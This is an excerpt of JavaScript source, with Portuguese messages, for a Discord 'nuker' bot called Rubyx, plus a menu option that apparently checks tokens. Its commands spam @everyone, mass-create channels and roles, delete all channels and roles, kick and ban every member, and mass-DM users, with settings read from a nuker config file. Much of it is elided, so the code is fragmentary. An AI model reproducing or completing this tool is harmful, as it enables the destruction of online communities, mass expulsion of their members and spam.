  ...
  readline.question("         [?] Escolha a opção: ".yellow, answer => {
    switch (answer) {
      ...
      case "1":
        ...
        const YLuck = new MessageAttachment.Client();
        ...
        YLuck.login(token_bot).catch(err => {
          console.clear();
...
${tokenchecker}                                                                                                                            
      ...
      case "6":
        ...
        const Rubyx = require("./Arquivos Config/nuker_bot.json");
        const Everyone = Rubyx.Everyone;
        const nome_canal_mp = Rubyx.nome_canal_mp;
        const criar_cargos = Rubyx.criar_cargos;
        const emoji_menu = Rubyx.emoji_menu;
        const status_da_twitch = Rubyx.status_da_twitch;
        const criar_canais = Rubyx.criar_canais;
        const nome_do_servidor = Rubyx.nome_do_servidor;
        const marcação = Rubyx.marcação;
        const icone_do_servidor = Rubyx.icone_do_servidor;
        const status_bot = Rubyx.status_bot;
            ...
            client.on("message", async message => {
              ...
              if (message.mentions.everyone === true) {
                ...
                if (message.content.startsWith(prefix + "visual")) {
                  if (message.author.id != myID) {
                    console.log(
                      `     [Rubyx] Um idiota tentou utilizando um comando`.white
                    );
                    return message.reply(
                      "Você não pode utilizar este comando!"
                    );
                  ...
                  console.log(
                    "     [Rubyx] Mudando icone & nome do servidor".green
                  );
                ...
                if (message.content.startsWith(prefix + "cc")) {
                  ...
                  if (!message.guild.me.permissions.has("MANAGE_CHANNELS")) {
                    ...
                    if (message.author.id != myID) {
                      console.log(
                        `     [Rubyx] Um idiota tentou utilizando um comando`
                          .white
                      );
                      return message.reply(
                        "Você não pode utilizar este comando!"
                    ...
                    message.delete();
                    console.log(yellow("    [Rubyx] Criando Canais"));
                ...
                if (message.content.startsWith(prefix + "mp")) {
                  if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                    return console.log(
                      red("     [Rubyx] O bot esta sem permição")
                    );
                  } else {
                    if (message.author.id != myID) {
                      console.log(
                      ...
                      if (!argresult) {
                        console.log(
                          blueBright(
                            `     [Rubyx] Marcando e postando umas coisas`
                          )
                        );
                      ...
                      console.log("     [Rubyx] Marcando e criado canais".red);
                      for (var i = 0; i < marcação; i++) {
                        let channels = message.guild.channels.create(
                          nome_canal_mp
                        );
                ...
                if (message.content.startsWith(prefix + "mr")) {
                  ...
                  if (!message.guild.me.permissions.has("MANAGE_ROLES")) {
                    ...
                    message.delete();
                    console.log("     [Rubyx] Criando cargos".green);
                    for (var i = 0; i < criar_cargos; i++) {
                      message.guild.roles
                        ...
                        .catch(e =>
                          console.error(red("     [Rubyx] Erro ao criar cargos"))
                        );
                    }
                  }
                }
                ...
                if (message.content.startsWith(prefix + "delcc")) {
                  ...
                  console.log("     [Rubyx] Deletando todos os canais".yellow);
                ...
                if (message.content.startsWith(prefix + "chute")) {
                  console.log("     [Rubyx] Expulsando todos os membros");
                  if (!message.guild.me.permissions.has("KICK_MEMBERS")) {
                    ...
                    message.guild.members.cache.forEach(member => {
                      member
                        ...
                        .then(
                          console.log(
                            green(`     [Rubyx] ${member.user.tag} foi expulso`)
                          )
                        )
                        .catch(e =>
                          console.error(
                            red(
                              `     [Rubyx] Incapaz de expulsar ${member.user.tag}`
                            )
                          )
                        );
                    });
                ...
                if (message.content.startsWith(prefix + "delrole")) {
                  ...
                  console.log("     [Rubyx] Deletando cargos".green);
                  message.guild.roles.cache.forEach(roles => {
                    roles
                      .delete()
                      .catch(e =>
                        console.error(
                          red(`     [Rubyx] Erro ao deletar um cargo`)
                        )
                      );
                  });
                }
                ...
                if (message.content.startsWith(prefix + "banall")) {
                  ...
                  console.log("     [Rubyx] Banindo todos os membros".blue);
                  if (!message.guild.me.permissions.has("BAN_MEMBERS")) {
                    ...
                    message.guild.members.cache.forEach(member => {
                      member
                        ...
                        .then(
                          console.log(
                            green(`     [Rubyx] ${member.user.tag} foi banido`)
                          )
                        )
                        .catch(e =>
                          console.error(
                            red(
                              `     [Rubyx] Incapaz de banir ${member.user.tag}`
                            )
                          )
                        );
                    });
                ...
                if (message.content.startsWith(prefix + "dmall")) {
                  ...
                  console.log(
                    "     [Rubyx] Enviando mensagem no privado de todos".blue
                  );
                  if (message.author.id !== myID) return;
                  const msg = args[0];
                  if (!msg)
                  ...
                  message.guild.members.cache.forEach(member => {
                    member
                      ...
                      .then(
                        console.log(
                          green(
                            `     [Rubyx] Mensagem enviada para ${member.user.tag}`
                          )
                        )
                      )
                      .catch(e =>
                        console.error(
                          red(
                            `     [Rubyx] Erro ao enviar para ${member.user.tag}`
                          )
                        )
                      );
                  });
